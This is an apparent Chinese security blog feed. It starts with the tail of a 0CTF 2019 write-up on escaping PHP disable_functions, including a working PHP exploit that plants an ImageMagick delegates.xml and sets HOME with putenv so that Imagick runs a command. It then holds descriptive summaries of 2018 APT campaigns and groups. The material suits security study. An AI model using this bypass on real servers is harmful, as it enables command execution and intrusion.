error_log(&quot;a&quot;,1,&quot;test@163.com&quot;,&quot;1&quot;);?&gt;</code></pre><p>然后我们来追踪一下函数调用情况</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp27.png" alt="此处输入图片的描述"></p><p>说明在这样的禁用 mail 的环境下我们是可以使用 error_log 进行劫持的</p><h3 id="3-第二种思路—-劫持共享库"><a href="#3-第二种思路—-劫持共享库" class="headerlink" title="3.第二种思路—&gt; 劫持共享库"></a><strong>3.第二种思路—&gt; 劫持共享库</strong></h3><p>后来发现我们可以不劫持具体的函数，我们可以直接劫持共享库，思路来源<a href="https://www.freebuf.com/articles/web/192052.html">是这里</a>，那么现在问题就简化成了我们只要能找到一个 php 的函数，这个函数在调用的时候能执行一个系统中自带的二进制文件就可以了(注意，不是 &#x2F;usr&#x2F;bin&#x2F;php 这个文件是 php 引擎的启动文件)</p><h3 id="4-第三种思路—-篡改环境变量"><a href="#4-第三种思路—-篡改环境变量" class="headerlink" title="4.第三种思路—&gt; 篡改环境变量"></a><strong>4.第三种思路—&gt; 篡改环境变量</strong></h3><p>不用多说，预期解肯定是和 imagick 这个库有关系，正如上面我引用的那篇文章中说的 Bypass disable_functions 的思路一共有以下四种的话：</p><p>**1.攻击后端组件：**寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；<br>**2.寻找未禁用的漏网函数：**常见的执行命令的函数有system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；<br>**3.mod_cgi 模式：**尝试修改 .htaccess，调整请求访问路由，绕过 php.ini中的任何限制；<br><strong>4.利用环境变量：</strong> LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>这里的官方解利用就一定是第一种方法，其实就是一种：“<strong>你禁用我 php 执行命令，但是你禁用不了 Imagick 执行命令</strong>” 的思想，那么如果 imagick 执行的命令我们是可控的，那么我们就成功了。</p><p>我们唯一的办法就是从整个组件的<a href="https://imagemagick.org/index.php">官网介绍</a>，和<a href="https://github.com/ImageMagick/ImageMagick">源码</a>中找到蛛丝马迹，后来在 <a href="https://imagemagick.org/source/delegates.xml">这里</a>  我们可以找到 imagick 的文件格式转换的配置文件</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp8.png" alt="此处输入图片的描述"></p><p>看一下这个 xml 自己的说明</p><pre><code class="hljs"> Delegate command file.  Commands which specify    decode=&quot;in_format&quot; encode=&quot;out_format&quot;  specify the rules for converting from in_format to out_format.  Use these  rules to translate directly between formats.  Commands which specify only    decode=&quot;in_format&quot;  specify the rules for converting from in_format to some format that  ImageMagick automatically recognizes. Use these rules to decode formats.  Commands which specify only   encode=&quot;out_format&quot;  specify the rules for an &quot;encoder&quot; which may accept any input format.  The substitution rules are as follows:    %a  authentication passphrase    %b  image file size in bytes    %g  image geometry    %h  image rows (height)    %i  input image filename    %#  input image signature    %m  input image format    %o  output image filename    %p  page number    %q  input image depth    %s  scene number    %u  unique temporary filename    %w  image columns (width)    %x  input image x resolution    %y  input image y resolution  Set option delegate:bimodal=true to process bimodal delegates otherwise they  are ignored.  If stealth=&quot;True&quot; the delegate is not listed in user requested  &quot;-list delegate&quot; listings. These are typically special internal delegates.  If spawn=&quot;True&quot;, ImageMagick does not wait for the delegate to finish, nor  will it read any output image.</code></pre><p>很明显，在图片进行格式转换的时候会执行 command 参数后面的命令，但是问题出现了，这个是全局的配置文件，我们有办法覆盖吗？那我们还是要从根源上去找，github 读有关文件格式转化的源码，看有没有我们利用的可能</p><p><strong>我们从 quickstart.txt 中找到了<a href="https://github.com/ImageMagick/ImageMagick/blob/826cbebfe562ac9160a3cb4316b4e4bed61203cb/QuickStart.txt#L72">这样的话</a></strong></p><pre><code class="hljs">Configuration Files      ImageMagick depends on a number of external configuration files which      include colors.xml, delegates.xml, and others.      ImageMagick searches for configuration files in the following order, and      loads them if found:          $MAGICK_CONFIGURE_PATH          $MAGICK_HOME/etc/ImageMagick          $MAGICK_HOME/share/ImageMagick-7.0.2/config          $HOME/.config/ImageMagick/          &lt;client path&gt;/etc/ImageMagick/          &lt;current directory&gt;/</code></pre><p>也就是说，其加载的 delegates.xml 是有一个默认的寻找位置的，我们先去环境中读取一下， 看看原来的环境变量设置什么(我们直接执行 phpinfo();)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp9.png" alt="此处输入图片的描述"></p><p>我们发现只有 HOME 这么一个环境变量，也就是说 <code>$MAGICK_CONFIGURE_PATH</code>、<code>$MAGICK_HOME</code> 都找不到我们的配置文件，那接下来就轮到 <code>$HOME</code> 了，我们现在只要能将 $HOME 改成我们可控的目录(在这里是出题人规定的 &#x2F;tmp&#x2F;md5(ip))，然后创建对应的.config&#x2F;ImageMagick&#x2F; 目录，然后再是将我们自定义的配置文件放在该目录下等到调用 文件格式修改的函数的时候就会加载我们恶意的配置文件，然后成功命令执行，而环境变量的修改出题人也给我们留了 putenv 这个函数，现在一切都梳理清楚了</p><p><strong>给出 exp</strong> </p><pre><code class="hljs">$home = &#39;/tmp/7087afd091c14610b696f6d551930014&#39;;ini_set(&#39;display_errors&#39;, 1); //mkdir(&quot;$home/.magick/&quot;);mkdir(&quot;$home/.config/&quot;);mkdir(&quot;$home/.config/ImageMagick&quot;);//file_put_contents(&quot;$home/.magick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);file_put_contents(&quot;$home/.config/ImageMagick/delegates.xml&quot;, &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);touch(&quot;$home/test.foo&quot;);$_ENV[&#39;HOME&#39;] = $home;var_dump(putenv(&quot;HOME=$home/&quot;));var_dump(getenv(&quot;HOME&quot;));try &#123;  $i = new Imagick(&quot;$home/test.foo&quot;);  $i-&gt;writeImage(&quot;$home/test.png&quot;);&#125; catch(Exception $e) &#123;  var_dump($e);&#125;var_dump(file_get_contents(&quot;$home/flag&quot;));</code></pre><p><strong>运行结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp10.png" alt="此处输入图片的描述"></p><h3 id="3-第三种思路：监控-tmp-目录"><a href="#3-第三种思路：监控-tmp-目录" class="headerlink" title="3.第三种思路：监控 &#x2F;tmp 目录"></a><strong>3.第三种思路：监控 &#x2F;tmp 目录</strong></h3><p>因为一开始出题人没有设置每个人的 tmp ，这让大家都是在一个 tmp 目录下混战，如图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp3.png" alt="此处输入图片的描述"></p><p>于是就有师傅们就有了各种各样的骚想法</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TCTF2019wp24.png" alt="此处输入图片的描述"></p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br><a href="https://www.lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/">https://www.lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/</a><br><a href="https://www.freebuf.com/vuls/166695.html">https://www.freebuf.com/vuls/166695.html</a><br><a href="https://jolokia.org/reference/html/protocol.html#request-response">https://jolokia.org/reference/html/protocol.html#request-response</a><br><a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw">https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw</a><br><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/">https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/</a><br><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a><br><a href="http://baijiahao.baidu.com/s?id=1600246970563166864&wfr=spider&for=pc">http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc</a><br><a href="https://www.ibm.com/developerworks/cn/java/j-lo-osgi/index.html">https://www.ibm.com/developerworks/cn/java/j-lo-osgi/index.html</a><br><a href="https://www.cnblogs.com/dongguacai/p/5900507.html">https://www.cnblogs.com/dongguacai/p/5900507.html</a><br><a href="https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/">https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/</a><br><a href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a><br><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018 APT (Advanced Persistent Threat)攻击大事件</title>
    <link href="/2019/03/23/2018%20APT%20(Advanced%20Persistent%20Threat)%E6%94%BB%E5%87%BB%E5%A4%A7%E4%BA%8B%E4%BB%B6/"/>
    <url>/2019/03/23/2018%20APT%20(Advanced%20Persistent%20Threat)%E6%94%BB%E5%87%BB%E5%A4%A7%E4%BA%8B%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="1-韩国平昌冬奥会APT攻击事件"><a href="#1-韩国平昌冬奥会APT攻击事件" class="headerlink" title="1.韩国平昌冬奥会APT攻击事件"></a><strong>1.韩国平昌冬奥会APT攻击事件</strong></h3><p>**攻击入口：**鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌恶意宏的Word文档</p><p>2.利用PowerShell实现的图片隐写技术，其使用开源工具Invoke-PSImage实现</p><p>3.利用失陷网站用于攻击载荷的分发和控制回传</p><p>4.伪装成韩国国家反恐中心（NCTC）的电子邮件地址发送鱼叉邮件，以及注册伪装成韩国农业和林业部的恶意域名</p><span id="more"></span><h3 id="2-VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件"><a href="#2-VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件" class="headerlink" title="2.VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件"></a><strong>2.VPNFilter：针对乌克兰IOT设备的恶意代码攻击事件</strong></h3><p>**攻击入口：**利用IOT设备漏洞远程获得初始控制权</p><p><strong>主要攻击战术技术：</strong></p><p>1.使用多阶段的载荷植入，不同阶段载荷功能模块实现不同</p><p>2.使用针对多种型号IOT设备的公开漏洞利用技术和默认访问凭据获得对设备的控制权</p><p>3.实现包括：数据包嗅探、窃取网站登录凭据、以及监控Modbus SCADA工控协议</p><p>4.针对多种CPU架构编译和执行</p><p>5.使用Tor或SSL加密协议进行C2通信</p><h3 id="3-APT28针对欧洲、北美地区的一系列定向攻击事件"><a href="#3-APT28针对欧洲、北美地区的一系列定向攻击事件" class="headerlink" title="3.  APT28针对欧洲、北美地区的一系列定向攻击事件"></a><strong>3.  APT28针对欧洲、北美地区的一系列定向攻击事件</strong></h3><p>**相关漏洞：**Office文档模板注入、疑似Lojack软件缺陷或0day漏洞</p><p><strong>攻击入口</strong>：鱼叉邮件、Office模板注入</p><p>主要攻击战术技术：</p><p>1.鱼叉邮件发送使用了Office模板注入攻击技术的恶意文档</p><p>2.远程注入恶意宏代码并执行</p><p>3.释放Delphi版的Cannon和.Net和C#等多个语言版本的Zebrocy木马进行远程控制</p><p>4.以及针对LoJack计算机防盗软件植入UEFI rootkit木马程序，实现重装系统及更换硬盘都无法消除的持久化远程控制</p><h3 id="4-蓝宝菇APT组织针对中国的一系列定向攻击事件"><a href="#4-蓝宝菇APT组织针对中国的一系列定向攻击事件" class="headerlink" title="4.蓝宝菇APT组织针对中国的一系列定向攻击事件"></a><strong>4.蓝宝菇APT组织针对中国的一系列定向攻击事件</strong></h3><p>相关漏洞：无</p><p>**攻击入口：**鱼叉邮件和水坑攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌PowerShell脚本的LNK文件，并利用邮件服务器的云附件方式进行投递</p><p>2.当受害者被诱导点击恶意LNK文件后，会执行LNK文件所指向的PowerShell命令，进而提取出LNK文件中的其他诱导文件、持久化后门和PowerShell后门脚本。<strong>PowerShell后门</strong>会通过对受害者的电脑中的特定格式文件进行打包并上传到第三方云空间（如：亚马逊云，新浪云等）</p><p>3.从网络上接受新的PowerShell后门代码执行，从而躲避了一些杀软的查杀</p><h3 id="5-海莲花APT组织针对我国和东南亚地区的定向攻击事件"><a href="#5-海莲花APT组织针对我国和东南亚地区的定向攻击事件" class="headerlink" title="5.海莲花APT组织针对我国和东南亚地区的定向攻击事件"></a><strong>5.海莲花APT组织针对我国和东南亚地区的定向攻击事件</strong></h3><p>**相关漏洞：**微软Office漏洞、MikroTik路由器漏洞、永恒之蓝漏洞</p><p>**攻击入口：**鱼叉邮件和水坑攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌恶意宏的Word文件、HTA文件、快捷方式文件、SFX自解压文件、捆绑后的文档图标的可执行文件等</p><p>2.入侵成功后通过一些内网渗透工具扫描渗透内网并横向移动，入侵重要服务器，植入Denis家族木马进行持久化控制</p><p>3.通过横向移动和渗透拿到域控或者重要的服务器权限，通过对这些重要机器的控制来设置水坑、利用第三方工具并辅助渗透</p><p>4.横向移动过程中还会使用一些逃避杀软检测的技术：包括白利用技术、PowerShell混淆技术等</p><h3 id="6-蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件"><a href="#6-蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件" class="headerlink" title="6.蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件"></a><strong>6.蔓灵花APT组织针对中国、巴基斯坦的一系列定向攻击事件</strong></h3><p>**相关漏洞：**InPage文字处理软件漏洞CVE-2017-12824、微软公式编辑器漏洞等</p><p>**攻击入口：**鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递内嵌Inpage漏洞利用文档、微软公式编辑器漏洞利用文档、伪造成文档&#x2F;图片的可执行文件等</p><p>2.触发漏洞后释放&#x2F;下载执行恶意木马，与C2保持通信，并根据C2返回的命令下载指定插件执行</p><p>3.下载执行多种远控插件进行远程控制</p><h3 id="7-APT38针对全球范围金融机构的攻击事件"><a href="#7-APT38针对全球范围金融机构的攻击事件" class="headerlink" title="7.APT38针对全球范围金融机构的攻击事件"></a><strong>7.APT38针对全球范围金融机构的攻击事件</strong></h3><p>**攻击入口：**鱼叉攻击，水坑攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.利用社交网络**，搜索等多种方式对攻击目标进行详细的网络侦查**</p><p>2.使用鱼叉攻击或水坑攻击<strong>对目标人员实施攻击并获得初始控制权</strong></p><p>3.在目标网络横向移动，最终以获得SWIFT系统终端为目标</p><p>4.伪造或修改交易数据达到窃取资金</p><p>5.通过格式化硬盘或日志等方式清除痕迹。</p><h3 id="8-疑似DarkHotel-APT组织利用多个IE-0day“双杀”漏洞的定向攻击事件"><a href="#8-疑似DarkHotel-APT组织利用多个IE-0day“双杀”漏洞的定向攻击事件" class="headerlink" title="8.疑似DarkHotel APT组织利用多个IE 0day“双杀”漏洞的定向攻击事件"></a><strong>8.疑似DarkHotel APT组织利用多个IE 0day“双杀”漏洞的定向攻击事件</strong></h3><p>**相关漏洞：**CVE-2018-8174、CVE-2018-8373等</p><p>**攻击入口：**鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.鱼叉邮件投递包含IE 0day双杀漏洞的Word文档</p><p>2.漏洞利用成功后释放**白利用文件(例如Radmin、TeamView、FreeSSH等。因为是合法程序，所以AV不会清除)**执行恶意PowerShell下载下一阶段PowerShell脚本</p><p>3.下载回来的PowerShell脚本进行Bypass UAC，并通过劫持系统DLL文件下载核心木马模块</p><p>4.核心木马模块与C2地址通信下载执行更多的木马插件实现持久化控制</p><p><strong>9.疑似APT33使用Shamoon V3针对中东地区能源企业的定向攻击事件</strong></p><p>**攻击入口：**鱼叉邮件攻击</p><p><strong>主要攻击战术技术：</strong></p><p>1.使用随机生成的数据覆盖系统上的MBR、分区和文件</p><p>2.恶意文件的文件描述模仿合法的产品名称</p><h3 id="10-Slingshot：一个复杂的网络间谍活动"><a href="#10-Slingshot：一个复杂的网络间谍活动" class="headerlink" title="10.Slingshot：一个复杂的网络间谍活动"></a><strong>10.Slingshot：一个复杂的网络间谍活动</strong></h3><p>**相关漏洞：**CVE-2007-5633、CVE-2010-1592、CVE-2009-0824</p><p>**攻击入口：**可能通过Windows漏洞利用或已感染的Mikrotik路由器</p><p><strong>主要攻击战术技术：</strong></p><p>1.初始loader程序将合法的Windows库‘scesrv.dll’替换为具有完全相同大小的恶意文件</p><p>2.包括内核层的加载器和网络嗅探模块，自定义的文件系统模块</p><p>3.可能通过Windows漏洞利用或已感染的Mikrotik路由器获得受害目标的初始控制权。</p>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APT(高级持续威胁) 概念以及趋势概述</title>
    <link href="/2019/03/21/APT(%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81)%20%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E8%B6%8B%E5%8A%BF%E6%A6%82%E8%BF%B0/"/>
    <url>/2019/03/21/APT(%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81)%20%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E8%B6%8B%E5%8A%BF%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01-概念："><a href="#0X01-概念：" class="headerlink" title="0X01 概念："></a><strong>0X01 概念：</strong></h2><p>APT，又称<strong>高级持续性威胁</strong>，通常<strong>用于区分由国家、政府或情报机构资助或具有相关背景的攻击团伙实施的攻击行动</strong>。该类攻击行动的动机往往与地缘<strong>政治冲突，军事行动</strong>相关，并以<strong>长久性的情报刺探、收集和监控</strong>为主要意图，其主要攻击的目标除了<strong>政府、军队、外交相关部门外，也包括科研、海事、能源、高新技术</strong>等领域。 </p><h2 id="0X02-高级持续性威胁背后的攻击者"><a href="#0X02-高级持续性威胁背后的攻击者" class="headerlink" title="0X02 高级持续性威胁背后的攻击者"></a><strong>0X02 高级持续性威胁背后的攻击者</strong></h2><h3 id="1-APT28"><a href="#1-APT28" class="headerlink" title="1.APT28"></a><strong>1.APT28</strong></h3><p><strong>Zebrocy 是APT28 专用的攻击工具集</strong>，主要目的是用作侦察（收集上传系统信息和截屏）和部署下一阶段的攻击载荷。Zebrocy 包含了.NET、AutoIT、Delphi、C++、PowerShell 和Go 等多种语言开发形态。安全厂商也发现该组织使用新的攻击恶意代码Cannon，<strong>其使用邮件协议作为C2的通信方式。</strong></p><h3 id="2-APT29"><a href="#2-APT29" class="headerlink" title="2.APT29"></a><strong>2.APT29</strong></h3><p>其实施鱼叉攻击是用于投放恶意的LNK文件，其中利用了该组织特有的一种LNK文件格式的利用技术。该组织木马会执行内嵌的PowerShell脚本命令,<strong>并从LNK 文件附加的数据中解密释放恶意载荷和诱导的PDF 文档文件</strong>。</p><span id="more"></span><h3 id="3-Lazarus-Group"><a href="#3-Lazarus-Group" class="headerlink" title="3.Lazarus Group"></a><strong>3.Lazarus Group</strong></h3><h3 id="4-肚脑虫（APT-C-35）"><a href="#4-肚脑虫（APT-C-35）" class="headerlink" title="4.肚脑虫（APT-C-35）"></a><strong>4.肚脑虫（APT-C-35）</strong></h3><p>其主要<strong>针对巴基斯坦和克什米尔地区</strong>的目标人员。该组织使用了两种特定的攻击恶意框架，EHDevel 和 yty，命名取自恶意代码中的 PDB 路径信息。<strong>该组织使用的攻击载荷使用了多种语言开发，包括C++、.NET、Python、VBS 和AutoIt</strong>。</p><p>360 威胁情报中心发现了该组织以“克什米尔问题”命名的<strong>诱饵漏洞文档，该文档利用了CVE-2017-8570 漏洞</strong>，其主要的攻击流程如下图。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B31.jpg" alt="此处输入图片的描述"></p><p>后续又发现该组织利用<strong>内嵌有恶意宏代码的 Excel 文档</strong>针对中国境内的巴基斯坦重要商务人士实施的攻击<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B33.jpg">6</a>，并向被控主机下发了多种载荷模块文件。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B32.jpg" alt="此处输入图片的描述"></p><h3 id="5-蔓灵花"><a href="#5-蔓灵花" class="headerlink" title="5.蔓灵花"></a><strong>5.蔓灵花</strong></h3><p>蔓灵花组织主要使用鱼叉邮件向目标人员投放<strong>漏洞利用文档</strong>，其中包括针对 <strong>Office 的漏洞文档和InPage 文字处理软件的漏洞文档</strong>（InPage 是一个专门针对乌尔都语使用者，即巴基斯坦国语设计的文字处理软件）。</p><p>该组织主要使用鱼叉钓鱼进行攻击，投递伪装成word图标的自解压文件：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B311.jpg" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B312.jpg" alt="此处输入图片的描述"></p><p>运行后，除了会执行恶意文件外，还会打开一个doc文档，用于迷惑用户，让用户以为打开的文件就是一个doc文档。诱饵文档内容极尽诱惑力：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B313.jpg" alt="此处输入图片的描述"></p><p>最终会下发键盘记录、上传文件、远控等插件，完成资料的窃取工作。</p><h3 id="6-Group-123-APT37"><a href="#6-Group-123-APT37" class="headerlink" title="6.Group 123(APT37)"></a><strong>6.Group 123(APT37)</strong></h3><p>Group 123 组织早期的攻击活动主要针对韩国，2017 年后延伸攻击目标至半岛范围，包括日本，越南和中东。其主要针对工业垂直领域，包括化学品、电子、制造、航空航天、汽车和医疗保健实体。360 威胁情报中心也曾发现该组织针对中国境内目标的攻击活动。</p><p>该组织在过去实施的攻击活动中主要<strong>以情报窃取为意图</strong>，并呈现出一些其<strong>特有的战术技术特点</strong>，包括：<br>1） 同时拥有对 PC（Windows） 和 Android 终端的攻击武器；<br>2） 对韩国网站实施入侵并作为攻击载荷分发和控制回传渠道，或者使用云盘，如 Yandex、Dropbox 等作为攻击载荷分发和控制回传渠道；<br>3） 使用 HWP 漏洞对韩国目标人员实施鱼叉攻击。</p><h2 id="0X03-针对中国境内的APT-组织和威胁"><a href="#0X03-针对中国境内的APT-组织和威胁" class="headerlink" title="0X03 针对中国境内的APT 组织和威胁"></a><strong>0X03 针对中国境内的APT 组织和威胁</strong></h2><h3 id="1-海莲花（APT-C-00）"><a href="#1-海莲花（APT-C-00）" class="headerlink" title="1.海莲花（APT-C-00）"></a><strong>1.海莲花（APT-C-00）</strong></h3><p>在2018 年中的全球高级持续性威胁报告中，我们总结了该组织使用的攻击战术和技术特点，包括使用开源的代码和公开的攻击工具，如Cobalt Strike。</p><p>“海莲花”在2018 年的攻击活动中使用了<strong>更加多样化的载荷投放形式</strong>，并使用<strong>多种白利用技术</strong>加载其恶意模块。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B33.jpg" alt="此处输入图片的描述"></p><p>还使用一些脚本技术</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B37.jpg" alt="此处输入图片的描述"></p><p>最终在内存中调用loader类，加载最终的由CobaltStrike生成的beacon.dll木马：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B38.jpg" alt="此处输入图片的描述"></p><p><strong>该组织在近期活动中主要的攻击过程如下</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B34.jpg" alt="此处输入图片的描述"></p><h3 id="2-毒云藤（APT-C-01）"><a href="#2-毒云藤（APT-C-01）" class="headerlink" title="2.毒云藤（APT-C-01）"></a><strong>2.毒云藤（APT-C-01）</strong></h3><p>毒云藤（APT-C-01），也被国内其他安全厂商称为穷奇、绿斑。该组织从2007 年开始至今，对中国国防、政府、科技、教育以及海事机构等重点单位和部门进行了长达11 年的网络间谍活动。<strong>该组织主要关注军工、中美关系、两岸关系和海洋相关领域。</strong></p><p>该组织主要使用<strong>鱼叉攻击投放漏洞文档或二进制可执行文件</strong>。下面两图为我们截获的该组织鱼叉邮件内容。<br>毒云藤组织主要使用的恶意木马包括Poison Ivy，ZxShell，XRAT 等，并<strong>使用动态域名，云盘，第三方博客作为其控制回传的基础设施</strong></p><h3 id="3-蓝宝菇（APT-C-12）"><a href="#3-蓝宝菇（APT-C-12）" class="headerlink" title="3.蓝宝菇（APT-C-12）"></a><strong>3.蓝宝菇（APT-C-12）</strong></h3><p>蓝宝菇（APT-C-12）组织的活动最早从2011 年开始并持续至今**，对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动**。</p><p>该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。在2018 年中的高级持续性威胁报告中曾对该组织进行了介绍。蓝宝菇组织也主要使用<strong>鱼叉邮件实施攻击，其投放的文件主要是RLO伪装成文档的可执行文件或LNK 格式文件</strong>。</p><p>该组织主要使用<strong>动态域名或IDC IP 最为其控制基础设施</strong>，<strong>后续也常使用AWSS3、新浪云等云服务</strong>作为其上传和托管窃取的数据。其常使用的恶意程序包括<strong>Poison Ivy、Bfnet，以及PowerShell 实现的后门。</strong></p><p>蓝宝菇和毒云藤两个组织从攻击来源来源来看，属于同一地域，但使用的TTP(策略技术流程)却存在一些差异。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B35.jpg" alt="此处输入图片的描述"></p><h3 id="4-Darkhotel（APT-C-06）"><a href="#4-Darkhotel（APT-C-06）" class="headerlink" title="4.Darkhotel（APT-C-06）"></a><strong>4.Darkhotel（APT-C-06）</strong></h3><p>趋势科技在2018 年7 月公开捕获了又一例<strong>VBScript Engine 的在野0day漏洞</strong>（CVE-2018-8373）攻击样本。360 威胁情报中心结合内部的威胁情报数据关联到该在野攻击与 Darkhotel 有关，该组织在2018 年多次利用 VBScript Engine 的相关0day 漏洞实施在野攻击活动。</p><p><strong>该组织的一大特色是喜欢把木马隐藏在开源的代码中进行伪装</strong>，如putty、openssl、zlib等，把少量木马代码隐藏在大量的开源代码中，从而实现躲避检测的目的，<strong>因此将被称为“寄生兽”。</strong></p><p>如使用msfte.dll和msTracer.dll，来进行持久性攻击，并把下发的shellcode隐藏在图片文件中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B39.jpg" alt="此处输入图片的描述"></p><p>同时通过下发插件的方式，完成相关的任务：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B310.jpg" alt="此处输入图片的描述"></p><p><strong>该组织的具体攻击流程如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B36.jpg" alt="此处输入图片的描述"></p><h2 id="0X04-APT-威胁的现状和挑战"><a href="#0X04-APT-威胁的现状和挑战" class="headerlink" title="0X04 APT 威胁的现状和挑战"></a><strong>0X04 APT 威胁的现状和挑战</strong></h2><h3 id="1-进化中的APT-攻防"><a href="#1-进化中的APT-攻防" class="headerlink" title="1.进化中的APT 攻防"></a><strong>1.进化中的APT 攻防</strong></h3><p>APT 组织也不再局限于其过去固有的攻击模式和武器，APT 组织不仅需要达到最终的攻击效果，还刻意避免被防御方根据留下的痕迹和特征追溯到其组织身份(false flag)。</p><h4 id="1-常见的APT攻击方式"><a href="#1-常见的APT攻击方式" class="headerlink" title="(1)常见的APT攻击方式"></a><strong>(1)常见的APT攻击方式</strong></h4><h5 id="1-鱼叉攻击"><a href="#1-鱼叉攻击" class="headerlink" title="1.鱼叉攻击"></a><strong>1.鱼叉攻击</strong></h5><p>2018年，<strong>鱼叉攻击依然是APT攻击的最主要方式</strong>，使用<strong>鱼叉结合社工类的方式，投递带有恶意文件的附件，诱使被攻击者打开</strong>。虽然该方式攻击成本极低，但是效果却出人意料的好。这也进一步体现了被攻击目标的人员的安全意识亟需加强。从曝光的APT活动来看，2018年使用鱼叉攻击的APT活动比例高达95%以上。</p><h5 id="2-水坑攻击"><a href="#2-水坑攻击" class="headerlink" title="2.水坑攻击"></a><strong>2.水坑攻击</strong></h5><p><strong>水坑攻击也是APT组织常用的攻击手段</strong>，2018年，海莲花、socketplayer等组织均使用过该攻击方式。除了插恶意代码外，<strong>攻击者还会判断访问该页面的访问者的ip，只有当访问者在攻击目标的ip范围内，才会进行下一步的攻击动作，依次来防止误伤</strong>。</p><h5 